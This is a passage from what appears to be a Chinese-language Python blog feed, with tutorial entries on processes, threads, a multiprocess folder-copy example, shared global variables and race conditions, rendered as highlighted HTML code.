random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy_file</span><span class="params">(queue, file_name,source_folder_name,  dest_folder_name)</span>:</span></span><br><span class="line">    <span class="string">"""copy文件到指定的路径"""</span></span><br><span class="line">    f_read = open(source_folder_name + <span class="string">"/"</span> + file_name, <span class="string">"rb"</span>)</span><br><span class="line">    f_write = open(dest_folder_name + <span class="string">"/"</span> + file_name, <span class="string">"wb"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time.sleep(random.random())</span><br><span class="line">        content = f_read.read(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> content:</span><br><span class="line">            f_write.write(content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    f_read.close()</span><br><span class="line">    f_write.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送已经拷贝完毕的文件名字</span></span><br><span class="line">    queue.put(file_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 获取要复制的文件夹</span></span><br><span class="line">    source_folder_name = input(<span class="string">"请输入要复制文件夹名字:"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 整理目标文件夹</span></span><br><span class="line">    dest_folder_name = source_folder_name + <span class="string">"[副本]"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建目标文件夹</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.mkdir(dest_folder_name)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span>  <span class="comment"># 如果文件夹已经存在，那么创建会失败</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取这个文件夹中所有的普通文件名</span></span><br><span class="line">    file_names = os.listdir(source_folder_name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建Queue</span></span><br><span class="line">    queue = multiprocessing.Manager().Queue()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建进程池</span></span><br><span class="line">    pool = multiprocessing.Pool(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">        <span class="comment"># 向进程池中添加任务</span></span><br><span class="line">        pool.apply_async(copy_file, args=(queue, file_name, source_folder_name, dest_folder_name))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 主进程显示进度</span></span><br><span class="line">    pool.close()</span><br><span class="line"></span><br><span class="line">    all_file_num = len(file_names)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_name = queue.get()</span><br><span class="line">        <span class="keyword">if</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">            file_names.remove(file_name)</span><br><span class="line"></span><br><span class="line">        copy_rate = (all_file_num-len(file_names))*<span class="number">100</span>/all_file_num</span><br><span class="line">        print(<span class="string">"\r%.2f...(%s)"</span> % (copy_rate, file_name) + <span class="string">" "</span>*<span class="number">50</span>, end=<span class="string">""</span>)</span><br><span class="line">        <span class="keyword">if</span> copy_rate &gt;= <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --&gt;&lt;h1 id=&quot;进程以及状态&quot;&gt;&lt;a href=&quot;#进程以及状态&quot; class=&quot;headerlink&quot; title=&quot;进程以及状态&quot;&gt;&lt;/a&gt;进程以及状态&lt;/h1&gt;&lt;h2 id=&quot;进程&quot;&gt;&lt;a href=&quot;#进程&quot; class=&quot;headerlink&quot; title=&quot;进程&quot;&gt;&lt;/a&gt;进程&lt;/h2&gt;&lt;p&gt;程序：例如xxx.py这是程序，是一个静态的&lt;br&gt;进程：一个程序运行起来后，代码+用到的资源 称之为进程，它是操作系统分配资源的基本单元。&lt;br&gt;不仅可以通过线程完成多任务，进程也是可以的&lt;/p&gt;&lt;h2 id=&quot;进程的状态&quot;&gt;&lt;a href=&quot;#进程的状态&quot; class=&quot;headerlink&quot; title=&quot;进程的状态&quot;&gt;&lt;/a&gt;进程的状态&lt;/h2&gt;&lt;p&gt;工作中，任务数往往大于cpu的核数，即一定有一些任务正在执行，而另外一些任务在等待cpu进行执行，因此导致了有了不同的状态&lt;br&gt;&lt;img src=&quot;/images_jincheng/001.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://yongnights.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://yongnights.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>多任务_线程</title>
    <link href="https://yongnights.github.io/2019/12/31/%E5%A4%9A%E4%BB%BB%E5%8A%A1_%E7%BA%BF%E7%A8%8B/"/>
    <id>https://yongnights.github.io/2019/12/31/多任务_线程/</id>
    <published>2019-12-31T04:00:48.282Z</published>
    <updated>2019-12-31T04:00:48.282Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --><h1 id="多任务的概念"><a href="#多任务的概念" class="headerlink" title="多任务的概念"></a>多任务的概念</h1><p>简单地说，就是操作系统可以同时运行多个任务。</p><p>现在，多核CPU已经非常普及了，但是，即使过去的单核CPU，也可以执行多任务。由于CPU执行代码都是顺序执行的，那么，单核CPU是怎么执行多任务的呢？</p><p>答案就是操作系统轮流让各个任务交替执行，任务1执行0.01秒，切换到任务2，任务2执行0.01秒，再切换到任务3，执行0.01秒……这样反复执行下去。表面上看，每个任务都是交替执行的，但是，由于CPU的执行速度实在是太快了，我们感觉就像所有任务都在同时执行一样。</p><p>真正的并行执行多任务只能在多核CPU上实现，但是，由于任务数量远远多于CPU的核心数量，所以，操作系统也会自动把很多任务轮流调度到每个核心上执行。</p><p>注意：</p><ul><li>并发：指的是任务数多于cpu核数，通过操作系统的各种任务调度算法，实现用多个任务“一起”执行（实际上总有一些任务不在执行，因为切换任务的速度相当快，看上去一起执行而已）</li><li>并行：指的是任务数小于等于cpu核数，即任务真的是一起执行的</li></ul><h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><p>python的thread模块是比较底层的模块，python的threading模块是对thread做了一些包装的，可以更加方便的被使用</p><h2 id="使用threading模块"><a href="#使用threading模块" class="headerlink" title="使用threading模块"></a>使用threading模块</h2><h3 id="单线程执行"><a href="#单线程执行" class="headerlink" title="单线程执行"></a>单线程执行</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saySorry</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"亲爱的，我错了，我能吃饭了吗？"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        saySorry()</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="多线程执行"><a href="#多线程执行" class="headerlink" title="多线程执行"></a>多线程执行</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saySorry</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"亲爱的，我错了，我能吃饭了吗？"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        t = threading.Thread(target=saySorry)</span><br><span class="line">        t.start() <span class="comment">#启动线程，即让线程开始执行</span></span><br></pre></td></tr></table></figure><p>说明</p><ul><li>可以明显看出使用了多线程并发的操作，花费时间要短很多</li><li>当调用start()时，才会真正的创建线程，并且开始执行</li></ul><h2 id="主线程会等待所有的子线程结束后才结束"><a href="#主线程会等待所有的子线程结束后才结束" class="headerlink" title="主线程会等待所有的子线程结束后才结束"></a>主线程会等待所有的子线程结束后才结束</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep,ctime</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sing</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        print(<span class="string">"正在唱歌...%d"</span>%i)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dance</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        print(<span class="string">"正在跳舞...%d"</span>%i)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'---开始---:%s'</span>%ctime())</span><br><span class="line"></span><br><span class="line">    t1 = threading.Thread(target=sing)</span><br><span class="line">    t2 = threading.Thread(target=dance)</span><br><span class="line"></span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#sleep(5) # 屏蔽此行代码，试试看，程序是否会立马结束？</span></span><br><span class="line">    print(<span class="string">'---结束---:%s'</span>%ctime())</span><br></pre></td></tr></table></figure><h2 id="查看线程数量"><a href="#查看线程数量" class="headerlink" title="查看线程数量"></a>查看线程数量</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep,ctime</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sing</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        print(<span class="string">"正在唱歌...%d"</span>%i)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dance</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        print(<span class="string">"正在跳舞...%d"</span>%i)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'---开始---:%s'</span>%ctime())</span><br><span class="line"></span><br><span class="line">    t1 = threading.Thread(target=sing)</span><br><span class="line">    t2 = threading.Thread(target=dance)</span><br><span class="line"></span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        length = len(threading.enumerate())</span><br><span class="line">        print(<span class="string">'当前运行的线程数为：%d'</span>%length)</span><br><span class="line">        <span class="keyword">if</span> length&lt;=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><h1 id="线程-注意点"><a href="#线程-注意点" class="headerlink" title="线程-注意点"></a>线程-注意点</h1><h2 id="线程执行代码的封装"><a href="#线程执行代码的封装" class="headerlink" title="线程执行代码的封装"></a>线程执行代码的封装</h2><p>通过使用threading模块能完成多任务的程序开发，为了让每个线程的封装性更完美，所以使用threading模块时，往往会定义一个新的子类class，只要继承threading.Thread就可以了，然后重写run方法<br>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            msg = <span class="string">"I'm "</span>+self.name+<span class="string">' @ '</span>+str(i) <span class="comment">#name属性中保存的是当前线程的名字</span></span><br><span class="line">            print(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t = MyThread()</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p>说明</p><ul><li>python的threading.Thread类有一个run方法，用于定义线程的功能函数，可以在自己的线程类中覆盖该方法。而创建自己的线程实例后，通过Thread类的start方法，可以启动该线程，交给python虚拟机进行调度，当该线程获得执行的机会时，就会调用run方法执行线程。</li></ul><h2 id="线程的执行顺序"><a href="#线程的执行顺序" class="headerlink" title="线程的执行顺序"></a>线程的执行顺序</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            msg = <span class="string">"I'm "</span>+self.name+<span class="string">' @ '</span>+str(i)</span><br><span class="line">            print(msg)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        t = MyThread()</span><br><span class="line">        t.start()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure><p>说明</p><ul><li>从代码和执行结果我们可以看出，多线程程序的执行顺序是不确定的。当执行到sleep语句时，线程将被阻塞（Blocked），到sleep结束后，线程进入就绪（Runnable）状态，等待调度。而线程调度将自行选择一个线程执行。上面的代码中只能保证每个线程都运行完整个run函数，但是线程的启动顺序、run函数中每次循环的执行顺序都不能确定。</li></ul><p>修改上述代码,使之能按顺序执行<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            <span class="comment"># time.sleep(1)</span></span><br><span class="line">            msg = <span class="string">"I'm "</span> + self.name + <span class="string">' @ '</span> + str(i)</span><br><span class="line">            print(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        t = MyThread()</span><br><span class="line">        t.start()</span><br><span class="line">        time.sleep(<span class="number">1</span>) <span class="comment"># 延迟时间可适当延长</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure><p></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>每个线程默认有一个名字，尽管上面的例子中没有指定线程对象的name，但是python会自动为线程指定一个名字。</li><li>当线程的run()方法结束时该线程完成。</li><li>无法控制线程调度程序，但可以通过别的方式来影响线程调度的方式。</li></ol><h1 id="多线程-共享全局变量"><a href="#多线程-共享全局变量" class="headerlink" title="多线程-共享全局变量"></a>多线程-共享全局变量</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">g_num = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> g_num</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        g_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"----in work1, g_num is %d---"</span> % g_num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> g_num</span><br><span class="line">    print(<span class="string">"----in work2, g_num is %d---"</span> % g_num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"---线程创建之前g_num is %d---"</span> % g_num)</span><br><span class="line"></span><br><span class="line">t1 = Thread(target=work1)</span><br><span class="line">t1.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 延时一会，保证t1线程中的事情做完</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t2 = Thread(target=work2)</span><br><span class="line">t2.start()</span><br></pre></td></tr></table></figure><h2 id="列表当做实参传递到线程中"><a href="#列表当做实参传递到线程中" class="headerlink" title="列表当做实参传递到线程中"></a>列表当做实参传递到线程中</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work1</span><span class="params">(nums)</span>:</span></span><br><span class="line">    nums.append(<span class="number">44</span>)</span><br><span class="line">    print(<span class="string">"----in work1---"</span>, nums)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work2</span><span class="params">(nums)</span>:</span></span><br><span class="line">    <span class="comment"># 延时一会，保证t1线程中的事情做完</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"----in work2---"</span>, nums)</span><br><span class="line"></span><br><span class="line">g_nums = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]</span><br><span class="line"></span><br><span class="line">t1 = Thread(target=work1, args=(g_nums,))</span><br><span class="line">t1.start()</span><br><span class="line"></span><br><span class="line">t2 = Thread(target=work2, args=(g_nums,))</span><br><span class="line">t2.start()</span><br></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ul><li>在一个进程内的所有线程共享全局变量，很方便在多个线程间共享数据</li><li>缺点就是，线程是对全局变量随意遂改可能造成多线程之间对全局变量的混乱（即线程非安全）</li></ul><h1 id="多线程-共享全局变量问题"><a href="#多线程-共享全局变量问题" class="headerlink" title="多线程-共享全局变量问题"></a>多线程-共享全局变量问题</h1><h2 id="多线程开发可能遇到的问题"><a href="#多线程开发可能遇到的问题" class="headerlink" title="多线程开发可能遇到的问题"></a>多线程开发可能遇到的问题</h2><p>假设两个线程t1和t2都要对全局变量g_num(默认是0)进行加1运算，t1和t2都各对g_num加10次，g_num的最终的结果应该为20。</p><p>但是由于是多线程同时操作，有可能出现下面情况：</p><ol><li>在g_num=0时，t1取得g_num=0。此时系统把t1调度为”sleeping”状态，把t2转换为”running”状态，t2也获得g_num=0</li><li>然后t2对得到的值进行加1并赋给g_num，使得g_num=1</li><li>然后系统又把t2调度为”sleeping”，把t1转为”running”。线程t1又把它之前得到的0加1后赋值给g_num。</li><li>这样导致虽然t1和t2都对g_num加1，但结果仍然是g_num=1</li></ol><h2 id="测试1"><a href="#测试1" class="headerlink" title="测试1"></a>测试1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">g_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work1</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> g_num</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        g_num += <span class="number">1</span></span><br><span class="line">    print(<span class="string">"----in work1, g_num is %d---"</span> % g_num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work2</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> g_num</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        g_num += <span class="number">1</span></span><br><span class="line">    print(<span class="string">"----in work2, g_num is %d---"</span> % g_num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"---线程创建之前g_num is %d---"</span> % g_num)</span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target=work1, args=(<span class="number">100</span>,))</span><br><span class="line">t1.start()</span><br><span class="line"></span><br><span class="line">t2 = threading.Thread(target=work2, args=(<span class="number">100</span>,))</span><br><span class="line">t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len(threading.enumerate()) != <span class="number">1</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"2个线程对同一个全局变量操作之后的最终结果是:%s"</span> % g_num)</span><br></pre></td></tr></table></figure><p>运行结果:<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---线程创建之前g_num is 0---</span><br><span class="line">----<span class="keyword">in</span> work1, g_num is 100---</span><br><span class="line">----<span class="keyword">in</span> work2, g_num is 200---</span><br><span class="line">2个线程对同一个全局变量操作之后的最终结果是:200</span><br></pre></td></tr></table></figure><p></p><h2 id="测试2"><a href="#测试2" class="headerlink" title="测试2"></a>测试2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 